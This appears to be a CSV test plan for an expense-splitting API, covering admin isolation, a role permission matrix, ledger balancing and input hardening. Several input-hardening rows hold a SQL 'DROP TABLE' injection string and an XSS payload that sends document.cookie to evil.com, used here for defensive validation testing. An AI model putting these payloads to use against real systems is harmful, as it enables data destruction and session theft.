TC-ADMIN-005,Admin - System Metrics,Happy Path,Medium,Prometheus metrics collection active (observability module),1. Admin GET system metrics endpoint,Metrics request,"200: returns aggregate metrics (request counts, error rates, DB latency) sourced from the observability module's Prometheus integration.",Section 1 Folder Architecture - observability/ Prometheus metrics,
TC-ADMIN-006,Admin - Support Tickets,Happy Path,Medium,A support ticket has been raised by a regular user (mechanism outside this doc's detail),1. Admin GET the support tickets list and updates a ticket's status to 'resolved',Ticket status update,200: ticket status persisted; visible to admin dashboard.,Section 2 Admin Control Plane - support tickets,
TC-ADMIN-007,Admin - Isolation,Permission,Critical,Admin authenticated with valid admin JWT,1. Admin attempts to call a REGULAR user-facing endpoint (e.g. GET /v1/groups) using the ADMIN JWT,Admin JWT used on non-admin route,"UNVERIFIED — doc doesn't state whether admin tokens are also valid for regular user routes (dual-purpose) or strictly scoped to /v1/admin/*; expected (best-guess) 401, since AdminUserEntity is a separate identity from UserEntity; confirm with dev.",Section 7 Admin JWT dedicated secrets,Known gap: cross-scope token validity not documented
TC-ADMIN-008,Admin - Revoked admin session,Negative,Critical,Admin account deactivated by a super-admin after JWT was issued,1. Deactivated admin attempts to use their still-unexpired admin JWT,"Deactivated admin, valid unexpired token",UNVERIFIED — doc doesn't specify real-time admin-deactivation enforcement (JWT stateless tokens may remain valid until natural expiry unless a revocation list is checked); confirm with dev.,Section 7 Admin JWT,Security-critical: immediate deactivation enforcement undocumented
TC-PERM-001,Permissions - expense_create,Permission,High,Group with a user assigned role='owner'; target resource exists in the group.,"1. Authenticate as the 'owner' user
2. Attempt the action gated by permission 'expense_create'","role=owner, permission=expense_create",200/201: action succeeds — 'owner' has 'expense_create' per Authorization Matrix.,Section 7 Authorization Matrix,
TC-PERM-002,Permissions - expense_create,Permission,High,Group with a user assigned role='admin'; target resource exists in the group.,"1. Authenticate as the 'admin' user
2. Attempt the action gated by permission 'expense_create'","role=admin, permission=expense_create",200/201: action succeeds — 'admin' has 'expense_create' per Authorization Matrix.,Section 7 Authorization Matrix,
TC-PERM-003,Permissions - expense_create,Permission,High,Group with a user assigned role='member'; target resource exists in the group.,"1. Authenticate as the 'member' user
2. Attempt the action gated by permission 'expense_create'","role=member, permission=expense_create",200/201: action succeeds — 'member' has 'expense_create' per Authorization Matrix.,Section 7 Authorization Matrix,
TC-PERM-004,Permissions - expense_create,Permission,High,Group with a user assigned role='viewer'; target resource exists in the group.,"1. Authenticate as the 'viewer' user
2. Attempt the action gated by permission 'expense_create'","role=viewer, permission=expense_create",403 Forbidden: 'viewer' is denied 'expense_create' per Authorization Matrix.,Section 7 Authorization Matrix,
TC-PERM-005,Permissions - expense_edit_own,Permission,High,Group with a user assigned role='owner'; target resource exists in the group.,"1. Authenticate as the 'owner' user
2. Attempt the action gated by permission 'expense_edit_own'","role=owner, permission=expense_edit_own",200/201: action succeeds — 'owner' has 'expense_edit_own' per Authorization Matrix.,Section 7 Authorization Matrix,
TC-PERM-006,Permissions - expense_edit_own,Permission,High,Group with a user assigned role='admin'; target resource exists in the group.,"1. Authenticate as the 'admin' user
2. Attempt the action gated by permission 'expense_edit_own'","role=admin, permission=expense_edit_own",200/201: action succeeds — 'admin' has 'expense_edit_own' per Authorization Matrix.,Section 7 Authorization Matrix,
TC-PERM-007,Permissions - expense_edit_own,Permission,High,Group with a user assigned role='member'; target resource exists in the group.,"1. Authenticate as the 'member' user
2. Attempt the action gated by permission 'expense_edit_own'","role=member, permission=expense_edit_own",200/201: action succeeds — 'member' has 'expense_edit_own' per Authorization Matrix.,Section 7 Authorization Matrix,
TC-PERM-008,Permissions - expense_edit_own,Permission,High,Group with a user assigned role='viewer'; target resource exists in the group.,"1. Authenticate as the 'viewer' user
2. Attempt the action gated by permission 'expense_edit_own'","role=viewer, permission=expense_edit_own",403 Forbidden: 'viewer' is denied 'expense_edit_own' per Authorization Matrix.,Section 7 Authorization Matrix,
TC-PERM-009,Permissions - expense_edit_any,Permission,Critical,Group with a user assigned role='owner'; target resource exists in the group.,"1. Authenticate as the 'owner' user
2. Attempt the action gated by permission 'expense_edit_any'","role=owner, permission=expense_edit_any",200/201: action succeeds — 'owner' has 'expense_edit_any' per Authorization Matrix.,Section 7 Authorization Matrix,
TC-PERM-010,Permissions - expense_edit_any,Permission,Critical,Group with a user assigned role='admin'; target resource exists in the group.,"1. Authenticate as the 'admin' user
2. Attempt the action gated by permission 'expense_edit_any'","role=admin, permission=expense_edit_any",200/201: action succeeds — 'admin' has 'expense_edit_any' per Authorization Matrix.,Section 7 Authorization Matrix,
TC-PERM-011,Permissions - expense_edit_any,Permission,Critical,Group with a user assigned role='member'; target resource exists in the group.,"1. Authenticate as the 'member' user
2. Attempt the action gated by permission 'expense_edit_any'","role=member, permission=expense_edit_any",403 Forbidden: 'member' is denied 'expense_edit_any' per Authorization Matrix.,Section 7 Authorization Matrix,
TC-PERM-012,Permissions - expense_edit_any,Permission,Critical,Group with a user assigned role='viewer'; target resource exists in the group.,"1. Authenticate as the 'viewer' user
2. Attempt the action gated by permission 'expense_edit_any'","role=viewer, permission=expense_edit_any",403 Forbidden: 'viewer' is denied 'expense_edit_any' per Authorization Matrix.,Section 7 Authorization Matrix,
TC-PERM-013,Permissions - expense_void,Permission,Critical,Group with a user assigned role='owner'; target resource exists in the group.,"1. Authenticate as the 'owner' user
2. Attempt the action gated by permission 'expense_void'","role=owner, permission=expense_void",200/201: action succeeds — 'owner' has 'expense_void' per Authorization Matrix.,Section 7 Authorization Matrix,
TC-PERM-014,Permissions - expense_void,Permission,Critical,Group with a user assigned role='admin'; target resource exists in the group.,"1. Authenticate as the 'admin' user
2. Attempt the action gated by permission 'expense_void'","role=admin, permission=expense_void",200/201: action succeeds — 'admin' has 'expense_void' per Authorization Matrix.,Section 7 Authorization Matrix,
TC-PERM-015,Permissions - expense_void,Permission,Critical,Group with a user assigned role='member'; target resource exists in the group.,"1. Authenticate as the 'member' user
2. Attempt the action gated by permission 'expense_void'","role=member, permission=expense_void",403 Forbidden: 'member' is denied 'expense_void' per Authorization Matrix.,Section 7 Authorization Matrix,
TC-PERM-016,Permissions - expense_void,Permission,Critical,Group with a user assigned role='viewer'; target resource exists in the group.,"1. Authenticate as the 'viewer' user
2. Attempt the action gated by permission 'expense_void'","role=viewer, permission=expense_void",403 Forbidden: 'viewer' is denied 'expense_void' per Authorization Matrix.,Section 7 Authorization Matrix,
TC-PERM-017,Permissions - settlement_confirm,Permission,High,Group with a user assigned role='owner'; target resource exists in the group.,"1. Authenticate as the 'owner' user
2. Attempt the action gated by permission 'settlement_confirm'","role=owner, permission=settlement_confirm",200/201: action succeeds — 'owner' has 'settlement_confirm' per Authorization Matrix.,Section 7 Authorization Matrix,
TC-PERM-018,Permissions - settlement_confirm,Permission,High,Group with a user assigned role='admin'; target resource exists in the group.,"1. Authenticate as the 'admin' user
2. Attempt the action gated by permission 'settlement_confirm'","role=admin, permission=settlement_confirm",200/201: action succeeds — 'admin' has 'settlement_confirm' per Authorization Matrix.,Section 7 Authorization Matrix,
TC-PERM-019,Permissions - settlement_confirm,Permission,High,Group with a user assigned role='member'; target resource exists in the group.,"1. Authenticate as the 'member' user
2. Attempt the action gated by permission 'settlement_confirm'","role=member, permission=settlement_confirm",200/201: action succeeds — 'member' has 'settlement_confirm' per Authorization Matrix.,Section 7 Authorization Matrix,
TC-PERM-020,Permissions - settlement_confirm,Permission,High,Group with a user assigned role='viewer'; target resource exists in the group.,"1. Authenticate as the 'viewer' user
2. Attempt the action gated by permission 'settlement_confirm'","role=viewer, permission=settlement_confirm",403 Forbidden: 'viewer' is denied 'settlement_confirm' per Authorization Matrix.,Section 7 Authorization Matrix,
TC-PERM-021,Permissions - member_invite,Permission,High,Group with a user assigned role='owner'; target resource exists in the group.,"1. Authenticate as the 'owner' user
2. Attempt the action gated by permission 'member_invite'","role=owner, permission=member_invite",200/201: action succeeds — 'owner' has 'member_invite' per Authorization Matrix.,Section 7 Authorization Matrix,
TC-PERM-022,Permissions - member_invite,Permission,High,Group with a user assigned role='admin'; target resource exists in the group.,"1. Authenticate as the 'admin' user
2. Attempt the action gated by permission 'member_invite'","role=admin, permission=member_invite",200/201: action succeeds — 'admin' has 'member_invite' per Authorization Matrix.,Section 7 Authorization Matrix,
TC-PERM-023,Permissions - member_invite,Permission,High,Group with a user assigned role='member'; target resource exists in the group.,"1. Authenticate as the 'member' user
2. Attempt the action gated by permission 'member_invite'","role=member, permission=member_invite",403 Forbidden: 'member' is denied 'member_invite' per Authorization Matrix.,Section 7 Authorization Matrix,
TC-PERM-024,Permissions - member_invite,Permission,High,Group with a user assigned role='viewer'; target resource exists in the group.,"1. Authenticate as the 'viewer' user
2. Attempt the action gated by permission 'member_invite'","role=viewer, permission=member_invite",403 Forbidden: 'viewer' is denied 'member_invite' per Authorization Matrix.,Section 7 Authorization Matrix,
TC-PERM-025,Permissions - member_role_change,Permission,Critical,Group with a user assigned role='owner'; target resource exists in the group.,"1. Authenticate as the 'owner' user
2. Attempt the action gated by permission 'member_role_change'","role=owner, permission=member_role_change",200/201: action succeeds — 'owner' has 'member_role_change' per Authorization Matrix.,Section 7 Authorization Matrix,
TC-PERM-026,Permissions - member_role_change,Permission,Critical,Group with a user assigned role='admin'; target resource exists in the group.,"1. Authenticate as the 'admin' user
2. Attempt the action gated by permission 'member_role_change'","role=admin, permission=member_role_change",403 Forbidden: 'admin' is denied 'member_role_change' per Authorization Matrix.,Section 7 Authorization Matrix,
TC-PERM-027,Permissions - member_role_change,Permission,Critical,Group with a user assigned role='member'; target resource exists in the group.,"1. Authenticate as the 'member' user
2. Attempt the action gated by permission 'member_role_change'","role=member, permission=member_role_change",403 Forbidden: 'member' is denied 'member_role_change' per Authorization Matrix.,Section 7 Authorization Matrix,
TC-PERM-028,Permissions - member_role_change,Permission,Critical,Group with a user assigned role='viewer'; target resource exists in the group.,"1. Authenticate as the 'viewer' user
2. Attempt the action gated by permission 'member_role_change'","role=viewer, permission=member_role_change",403 Forbidden: 'viewer' is denied 'member_role_change' per Authorization Matrix.,Section 7 Authorization Matrix,
TC-PERM-029,Permissions - export,Permission,Critical,Group with a user assigned role='owner'; target resource exists in the group.,"1. Authenticate as the 'owner' user
2. Attempt the action gated by permission 'export'","role=owner, permission=export",200/201: action succeeds — 'owner' has 'export' per Authorization Matrix.,Section 7 Authorization Matrix,
TC-PERM-030,Permissions - export,Permission,Critical,Group with a user assigned role='admin'; target resource exists in the group.,"1. Authenticate as the 'admin' user
2. Attempt the action gated by permission 'export'","role=admin, permission=export",200/201: action succeeds — 'admin' has 'export' per Authorization Matrix.,Section 7 Authorization Matrix,
TC-PERM-031,Permissions - export,Permission,Critical,Group with a user assigned role='member'; target resource exists in the group.,"1. Authenticate as the 'member' user
2. Attempt the action gated by permission 'export'","role=member, permission=export",403 Forbidden: 'member' is denied 'export' per Authorization Matrix.,Section 7 Authorization Matrix,
TC-PERM-032,Permissions - export,Permission,Critical,Group with a user assigned role='viewer'; target resource exists in the group.,"1. Authenticate as the 'viewer' user
2. Attempt the action gated by permission 'export'","role=viewer, permission=export",403 Forbidden: 'viewer' is denied 'export' per Authorization Matrix.,Section 7 Authorization Matrix,
TC-PERM-033,Permissions - archive,Permission,High,Group with a user assigned role='owner'; target resource exists in the group.,"1. Authenticate as the 'owner' user
2. Attempt the action gated by permission 'archive'","role=owner, permission=archive",200/201: action succeeds — 'owner' has 'archive' per Authorization Matrix.,Section 7 Authorization Matrix,
TC-PERM-034,Permissions - archive,Permission,High,Group with a user assigned role='admin'; target resource exists in the group.,"1. Authenticate as the 'admin' user
2. Attempt the action gated by permission 'archive'","role=admin, permission=archive",403 Forbidden: 'admin' is denied 'archive' per Authorization Matrix.,Section 7 Authorization Matrix,
TC-PERM-035,Permissions - archive,Permission,High,Group with a user assigned role='member'; target resource exists in the group.,"1. Authenticate as the 'member' user
2. Attempt the action gated by permission 'archive'","role=member, permission=archive",403 Forbidden: 'member' is denied 'archive' per Authorization Matrix.,Section 7 Authorization Matrix,
TC-PERM-036,Permissions - archive,Permission,High,Group with a user assigned role='viewer'; target resource exists in the group.,"1. Authenticate as the 'viewer' user
2. Attempt the action gated by permission 'archive'","role=viewer, permission=archive",403 Forbidden: 'viewer' is denied 'archive' per Authorization Matrix.,Section 7 Authorization Matrix,
TC-PERM-037,Permissions - Cross-group isolation,Permission,Critical,User A is Owner of Group G1 but has no membership in Group G2,1. A (authenticated) attempts any action (view/edit/expense_create) scoped to Group G2 using G2's groupId,"Actor=A, target group=G2 (not a member)","403/404: role/permissions granted in G1 do NOT carry over to G2 — permissions are strictly scoped per-group via GroupMembershipEntity, not global.",Section 4.2 GroupMembershipEntity - per-group role scoping,Critical multi-tenancy isolation check
TC-PERM-038,Permissions - Role downgrade mid-session,State-Sequence,High,"User B is Admin of Group G with a valid, unexpired access token","1. Owner downgrades B's role from admin to member
2. B (still holding the OLD access token) attempts an admin-only action (expense_void)","B downgraded, reuses old token","403 Forbidden: permission checks must be evaluated against CURRENT GroupMembershipEntity.role on each request, not cached in the JWT payload — the stale token's implicit role must not grant admin access post-downgrade.",Section 7 Authorization Matrix; Section 4.2 GroupMembershipEntity.role,"Security-critical: permission checks must be live, not JWT-cached"
TC-PERM-039,Permissions - Guest/ghost participant,Boundary,Medium,Ghost ParticipantEntity (userId=null) is assigned expense shares but has no UserEntity/login,1. Attempt any authenticated action 'as' the ghost participant (should be impossible since no credentials exist),"Ghost participant, no auth identity",N/A for direct auth — ghost participants cannot authenticate; verify they can still be validly referenced in expense shares/ledger postings by other authenticated members.,Section 4.2 ParticipantEntity.userId nullable,
TC-LEDGER-001,Balanced Ledger,Happy Path,Critical,Any financial action about to post to the ledger,"1. Create an expense totalAmountMinor=15000 split equally among 3 members
2. Fetch all LedgerPostingEntity rows created by this event
3. Sum signedAmountMinor grouped by currencyCode","totalAmountMinor=15000, 3 participants","Sum of signedAmountMinor across all postings for INR = 0 exactly, per BalancedPostingSet.create() invariant.",Section 3.5 Balanced Posting Set - sum(signedAmountMinor)===0,
TC-LEDGER-002,Balanced Ledger,Negative,Critical,"Hypothetical malformed posting set (simulated at the domain-logic unit-test level, e.g. directly calling BalancedPostingSet.create with intentionally unbalanced postings)",1. Call BalancedPostingSet.create() with postings summing to +50 for INR instead of 0,"Deliberately unbalanced postings, total=50",Throws Error: 'Ledger postings must balance to zero for INR; got 50.' — no LedgerPostingEntity rows are persisted.,Section 3.5 BalancedPostingSet.create - throws on non-zero total,
TC-LEDGER-003,Balanced Ledger,Negative,High,Posting set includes a non-integer signedAmountMinor (e.g. 100.5),1. Call BalancedPostingSet.create() with one posting.signedAmountMinor=100.5,Non-integer posting amount,Throws Error: 'Ledger posting amounts must use integer minor units.' before the balance-sum check even runs.,Section 3.5 BalancedPostingSet.create - Number.isInteger guard,
TC-LEDGER-004,Balanced Ledger,Boundary,High,Posting set spans TWO currencies within the same event (e.g. a multi-currency group settlement),"1. Create postings: INR entries summing to 0, and USD entries summing to 0, within the same BalancedPostingSet.create() call","Mixed INR+USD postings, each currency balances independently",Success: the totals Map tracks each currencyCode independently; both INR sum=0 and USD sum=0 are validated separately and both must pass — a currency-crossing imbalance (e.g. INR short by an amount coincidentally offset by USD) MUST still fail per-currency.,Section 3.5 BalancedPostingSet.create - per-currency totals Map,
TC-LEDGER-005,Balanced Ledger - Immutability,Happy Path,Critical,Expense with 2 versions (created then edited once),"1. Query EventStoreEntity for the aggregateId of this expense
2. Verify both the original EXPENSE_CREATED and subsequent update event are present and unmodified",2-version expense history,"EventStoreEntity contains BOTH the original event AND the edit event as separate immutable rows (append-only); no row is ever updated or deleted in place, preserving full audit history.",Section 4.4 EventStoreEntity - immutable ledger event journal,
TC-LEDGER-006,Balanced Ledger - Projection Consistency,Integration,Critical,GroupBalanceProjectionEntity is a cached read-model derived from ledger postings,"1. Sum all LedgerPostingEntity.signedAmountMinor per participant directly from the event-sourced table
2. Compare against GroupBalanceProjectionEntity.netBalanceMinor for the same participant",Cross-check projection vs. raw ledger,"The two values must always be exactly equal — GroupBalanceProjectionEntity is documented as 'Updated synchronously on every ledger event transaction,' so no drift should ever be observable.",Section 4.4 GroupBalanceProjectionEntity - updated synchronously,High-value consistency check between CQRS read-model and source of truth
TC-VALID-001,Input Hardening - Group name,Negative,Critical,Endpoint POST /v1/groups reachable with a valid authenticated actor.,"1. Submit the request to POST /v1/groups with name=""'; DROP TABLE expense_projections;--""",name='; DROP TABLE expense_projections;--,TypeORM parameterized queries prevent execution; table remains intact; value stored/rejected as literal text or 400 on length/format rules.,Section 8 DTO Input Validation,
TC-VALID-002,Input Hardening - Group name,Negative,Medium,Endpoint POST /v1/groups reachable with a valid authenticated actor.,"1. Submit the request to POST /v1/groups with name=""'; return true; var x='""",name='; return true; var x=',Value is treated as an inert string; no query logic is altered since TypeORM/Postgres is not vulnerable to JS injection.,Section 8 DTO Input Validation,
TC-VALID-003,Input Hardening - Group name,Negative,Critical,Endpoint POST /v1/groups reachable with a valid authenticated actor.,"1. Submit the request to POST /v1/groups with name=""<script>document.location='http://evil.com/'+document.cookie</script>""",name=<script>document.location='http://evil.com/'+document.cookie</script>,Value is stored/rejected as literal text; API response never causes this to execute in any client context (verify no unescaped reflection).,Section 8 DTO Input Validation,
TC-VALID-004,Input Hardening - Group name,Negative,Medium,Endpoint POST /v1/groups reachable with a valid authenticated actor.,"1. Submit the request to POST /v1/groups with name=""'Z' * 50000""",name='Z' * 50000,"UNVERIFIED — undocumented max length for this field; expect 400 if a cap exists, confirm with dev.",Section 8 DTO Input Validation,Undocumented field-length/encoding policy
TC-VALID-005,Input Hardening - Group name,Negative,Medium,Endpoint POST /v1/groups reachable with a valid authenticated actor.,"1. Submit the request to POST /v1/groups with name=""'🎉💰₹ पैसा 日本語'""",name='🎉💰₹ पैसा 日本語',"Stored and returned unchanged, UTF-8 safe, no mojibake or truncation mid-codepoint.",Section 8 DTO Input Validation,
TC-VALID-006,Input Hardening - Group name,Negative,Medium,Endpoint POST /v1/groups reachable with a valid authenticated actor.,"1. Submit the request to POST /v1/groups with name=""'valid-looking\\u0000hidden'""",name='valid-looking\u0000hidden',UNVERIFIED — undocumented null-byte handling; expect rejection or safe truncation at the null byte; confirm with dev.,Section 8 DTO Input Validation,Undocumented field-length/encoding policy
TC-VALID-007,Input Hardening - Expense description,Negative,Critical,Endpoint POST /v1/groups/:id/expenses reachable with a valid authenticated actor.,"1. Submit the request to POST /v1/groups/:id/expenses with description=""'; DROP TABLE expense_projections;--""",description='; DROP TABLE expense_projections;--,TypeORM parameterized queries prevent execution; table remains intact; value stored/rejected as literal text or 400 on length/format rules.,Section 8 DTO Input Validation,
TC-VALID-008,Input Hardening - Expense description,Negative,Medium,Endpoint POST /v1/groups/:id/expenses reachable with a valid authenticated actor.,"1. Submit the request to POST /v1/groups/:id/expenses with description=""'; return true; var x='""",description='; return true; var x=',Value is treated as an inert string; no query logic is altered since TypeORM/Postgres is not vulnerable to JS injection.,Section 8 DTO Input Validation,
TC-VALID-009,Input Hardening - Expense description,Negative,Critical,Endpoint POST /v1/groups/:id/expenses reachable with a valid authenticated actor.,"1. Submit the request to POST /v1/groups/:id/expenses with description=""<script>document.location='http://evil.com/'+document.cookie</script>""",description=<script>document.location='http://evil.com/'+document.cookie</script>,Value is stored/rejected as literal text; API response never causes this to execute in any client context (verify no unescaped reflection).,Section 8 DTO Input Validation,
TC-VALID-010,Input Hardening - Expense description,Negative,Medium,Endpoint POST /v1/groups/:id/expenses reachable with a valid authenticated actor.,"1. Submit the request to POST /v1/groups/:id/expenses with description=""'Z' * 50000""",description='Z' * 50000,"UNVERIFIED — undocumented max length for this field; expect 400 if a cap exists, confirm with dev.",Section 8 DTO Input Validation,Undocumented field-length/encoding policy
TC-VALID-011,Input Hardening - Expense description,Negative,Medium,Endpoint POST /v1/groups/:id/expenses reachable with a valid authenticated actor.,"1. Submit the request to POST /v1/groups/:id/expenses with description=""'🎉💰₹ पैसा 日本語'""",description='🎉💰₹ पैसा 日本語',"Stored and returned unchanged, UTF-8 safe, no mojibake or truncation mid-codepoint.",Section 8 DTO Input Validation,
TC-VALID-012,Input Hardening - Expense description,Negative,Medium,Endpoint POST /v1/groups/:id/expenses reachable with a valid authenticated actor.,"1. Submit the request to POST /v1/groups/:id/expenses with description=""'valid-looking\\u0000hidden'""",description='valid-looking\u0000hidden',UNVERIFIED — undocumented null-byte handling; expect rejection or safe truncation at the null byte; confirm with dev.,Section 8 DTO Input Validation,Undocumented field-length/encoding policy
TC-VALID-013,Input Hardening - Comment text,Negative,Critical,Endpoint Expense comment endpoint reachable with a valid authenticated actor.,"1. Submit the request to Expense comment endpoint with text=""'; DROP TABLE expense_projections;--""",text='; DROP TABLE expense_projections;--,TypeORM parameterized queries prevent execution; table remains intact; value stored/rejected as literal text or 400 on length/format rules.,Section 8 DTO Input Validation,
TC-VALID-014,Input Hardening - Comment text,Negative,Medium,Endpoint Expense comment endpoint reachable with a valid authenticated actor.,"1. Submit the request to Expense comment endpoint with text=""'; return true; var x='""",text='; return true; var x=',Value is treated as an inert string; no query logic is altered since TypeORM/Postgres is not vulnerable to JS injection.,Section 8 DTO Input Validation,
TC-VALID-015,Input Hardening - Comment text,Negative,Critical,Endpoint Expense comment endpoint reachable with a valid authenticated actor.,"1. Submit the request to Expense comment endpoint with text=""<script>document.location='http://evil.com/'+document.cookie</script>""",text=<script>document.location='http://evil.com/'+document.cookie</script>,Value is stored/rejected as literal text; API response never causes this to execute in any client context (verify no unescaped reflection).,Section 8 DTO Input Validation,
TC-VALID-016,Input Hardening - Comment text,Negative,Medium,Endpoint Expense comment endpoint reachable with a valid authenticated actor.,"1. Submit the request to Expense comment endpoint with text=""'Z' * 50000""",text='Z' * 50000,"UNVERIFIED — undocumented max length for this field; expect 400 if a cap exists, confirm with dev.",Section 8 DTO Input Validation,Undocumented field-length/encoding policy
TC-VALID-017,Input Hardening - Comment text,Negative,Medium,Endpoint Expense comment endpoint reachable with a valid authenticated actor.,"1. Submit the request to Expense comment endpoint with text=""'🎉💰₹ पैसा 日本語'""",text='🎉💰₹ पैसा 日本語',"Stored and returned unchanged, UTF-8 safe, no mojibake or truncation mid-codepoint.",Section 8 DTO Input Validation,
TC-VALID-018,Input Hardening - Comment text,Negative,Medium,Endpoint Expense comment endpoint reachable with a valid authenticated actor.,"1. Submit the request to Expense comment endpoint with text=""'valid-looking\\u0000hidden'""",text='valid-looking\u0000hidden',UNVERIFIED — undocumented null-byte handling; expect rejection or safe truncation at the null byte; confirm with dev.,Section 8 DTO Input Validation,Undocumented field-length/encoding policy
TC-VALID-019,Input Hardening - User display name,Negative,Critical,Endpoint PATCH /v1/users/me reachable with a valid authenticated actor.,"1. Submit the request to PATCH /v1/users/me with displayName=""'; DROP TABLE expense_projections;--""",displayName='; DROP TABLE expense_projections;--,TypeORM parameterized queries prevent execution; table remains intact; value stored/rejected as literal text or 400 on length/format rules.,Section 8 DTO Input Validation,
TC-VALID-020,Input Hardening - User display name,Negative,Medium,Endpoint PATCH /v1/users/me reachable with a valid authenticated actor.,"1. Submit the request to PATCH /v1/users/me with displayName=""'; return true; var x='""",displayName='; return true; var x=',Value is treated as an inert string; no query logic is altered since TypeORM/Postgres is not vulnerable to JS injection.,Section 8 DTO Input Validation,
TC-VALID-021,Input Hardening - User display name,Negative,Critical,Endpoint PATCH /v1/users/me reachable with a valid authenticated actor.,"1. Submit the request to PATCH /v1/users/me with displayName=""<script>document.location='http://evil.com/'+document.cookie</script>""",displayName=<script>document.location='http://evil.com/'+document.cookie</script>,Value is stored/rejected as literal text; API response never causes this to execute in any client context (verify no unescaped reflection).,Section 8 DTO Input Validation,
TC-VALID-022,Input Hardening - User display name,Negative,Medium,Endpoint PATCH /v1/users/me reachable with a valid authenticated actor.,"1. Submit the request to PATCH /v1/users/me with displayName=""'Z' * 50000""",displayName='Z' * 50000,"UNVERIFIED — undocumented max length for this field; expect 400 if a cap exists, confirm with dev.",Section 8 DTO Input Validation,Undocumented field-length/encoding policy
TC-VALID-023,Input Hardening - User display name,Negative,Medium,Endpoint PATCH /v1/users/me reachable with a valid authenticated actor.,"1. Submit the request to PATCH /v1/users/me with displayName=""'🎉💰₹ पैसा 日本語'""",displayName='🎉💰₹ पैसा 日本語',"Stored and returned unchanged, UTF-8 safe, no mojibake or truncation mid-codepoint.",Section 8 DTO Input Validation,
TC-VALID-024,Input Hardening - User display name,Negative,Medium,Endpoint PATCH /v1/users/me reachable with a valid authenticated actor.,"1. Submit the request to PATCH /v1/users/me with displayName=""'valid-looking\\u0000hidden'""",displayName='valid-looking\u0000hidden',UNVERIFIED — undocumented null-byte handling; expect rejection or safe truncation at the null byte; confirm with dev.,Section 8 DTO Input Validation,Undocumented field-length/encoding policy
TC-VALID-025,Input Hardening - Friend nickname/alias,Negative,Critical,Endpoint ContactAliasEntity alias field reachable with a valid authenticated actor.,"1. Submit the request to ContactAliasEntity alias field with alias=""'; DROP TABLE expense_projections;--""",alias='; DROP TABLE expense_projections;--,TypeORM parameterized queries prevent execution; table remains intact; value stored/rejected as literal text or 400 on length/format rules.,Section 8 DTO Input Validation,
TC-VALID-026,Input Hardening - Friend nickname/alias,Negative,Medium,Endpoint ContactAliasEntity alias field reachable with a valid authenticated actor.,"1. Submit the request to ContactAliasEntity alias field with alias=""'; return true; var x='""",alias='; return true; var x=',Value is treated as an inert string; no query logic is altered since TypeORM/Postgres is not vulnerable to JS injection.,Section 8 DTO Input Validation,
TC-VALID-027,Input Hardening - Friend nickname/alias,Negative,Critical,Endpoint ContactAliasEntity alias field reachable with a valid authenticated actor.,"1. Submit the request to ContactAliasEntity alias field with alias=""<script>document.location='http://evil.com/'+document.cookie</script>""",alias=<script>document.location='http://evil.com/'+document.cookie</script>,Value is stored/rejected as literal text; API response never causes this to execute in any client context (verify no unescaped reflection).,Section 8 DTO Input Validation,
TC-VALID-028,Input Hardening - Friend nickname/alias,Negative,Medium,Endpoint ContactAliasEntity alias field reachable with a valid authenticated actor.,"1. Submit the request to ContactAliasEntity alias field with alias=""'Z' * 50000""",alias='Z' * 50000,"UNVERIFIED — undocumented max length for this field; expect 400 if a cap exists, confirm with dev.",Section 8 DTO Input Validation,Undocumented field-length/encoding policy
TC-VALID-029,Input Hardening - Friend nickname/alias,Negative,Medium,Endpoint ContactAliasEntity alias field reachable with a valid authenticated actor.,"1. Submit the request to ContactAliasEntity alias field with alias=""'🎉💰₹ पैसा 日本語'""",alias='🎉💰₹ पैसा 日本語',"Stored and returned unchanged, UTF-8 safe, no mojibake or truncation mid-codepoint.",Section 8 DTO Input Validation,
TC-VALID-030,Input Hardening - Friend nickname/alias,Negative,Medium,Endpoint ContactAliasEntity alias field reachable with a valid authenticated actor.,"1. Submit the request to ContactAliasEntity alias field with alias=""'valid-looking\\u0000hidden'""",alias='valid-looking\u0000hidden',UNVERIFIED — undocumented null-byte handling; expect rejection or safe truncation at the null byte; confirm with dev.,Section 8 DTO Input Validation,Undocumented field-length/encoding policy
TC-VALID-031,Input Hardening - Settlement note,Negative,Critical,Endpoint POST /v1/settlements/intents reachable with a valid authenticated actor.,"1. Submit the request to POST /v1/settlements/intents with note=""'; DROP TABLE expense_projections;--""",note='; DROP TABLE expense_projections;--,TypeORM parameterized queries prevent execution; table remains intact; value stored/rejected as literal text or 400 on length/format rules.,Section 8 DTO Input Validation,
TC-VALID-032,Input Hardening - Settlement note,Negative,Medium,Endpoint POST /v1/settlements/intents reachable with a valid authenticated actor.,"1. Submit the request to POST /v1/settlements/intents with note=""'; return true; var x='""",note='; return true; var x=',Value is treated as an inert string; no query logic is altered since TypeORM/Postgres is not vulnerable to JS injection.,Section 8 DTO Input Validation,
TC-VALID-033,Input Hardening - Settlement note,Negative,Critical,Endpoint POST /v1/settlements/intents reachable with a valid authenticated actor.,"1. Submit the request to POST /v1/settlements/intents with note=""<script>document.location='http://evil.com/'+document.cookie</script>""",note=<script>document.location='http://evil.com/'+document.cookie</script>,Value is stored/rejected as literal text; API response never causes this to execute in any client context (verify no unescaped reflection).,Section 8 DTO Input Validation,
TC-VALID-034,Input Hardening - Settlement note,Negative,Medium,Endpoint POST /v1/settlements/intents reachable with a valid authenticated actor.,"1. Submit the request to POST /v1/settlements/intents with note=""'Z' * 50000""",note='Z' * 50000,"UNVERIFIED — undocumented max length for this field; expect 400 if a cap exists, confirm with dev.",Section 8 DTO Input Validation,Undocumented field-length/encoding policy
TC-VALID-035,Input Hardening - Settlement note,Negative,Medium,Endpoint POST /v1/settlements/intents reachable with a valid authenticated actor.,"1. Submit the request to POST /v1/settlements/intents with note=""'🎉💰₹ पैसा 日本語'""",note='🎉💰₹ पैसा 日本語',"Stored and returned unchanged, UTF-8 safe, no mojibake or truncation mid-codepoint.",Section 8 DTO Input Validation,
TC-VALID-036,Input Hardening - Settlement note,Negative,Medium,Endpoint POST /v1/settlements/intents reachable with a valid authenticated actor.,"1. Submit the request to POST /v1/settlements/intents with note=""'valid-looking\\u0000hidden'""",note='valid-looking\u0000hidden',UNVERIFIED — undocumented null-byte handling; expect rejection or safe truncation at the null byte; confirm with dev.,Section 8 DTO Input Validation,Undocumented field-length/encoding policy
TC-VALID-037,DTO Type Validation,Negative,High,POST /v1/groups/:id/expenses reachable,1. Submit totalAmountMinor as a string '10000' instead of a number,"totalAmountMinor='10000' (string, not number)","400 Bad Request: class-transformer/class-validator type coercion rules reject or the DTO strictly requires a number type — confirm exact behavior (auto-coercion vs rejection) with dev if ambiguous, but a non-numeric-typed field must never silently corrupt Money.amountMinor.",Section 8 DTO Input Validation - class-validator/class-transformer,
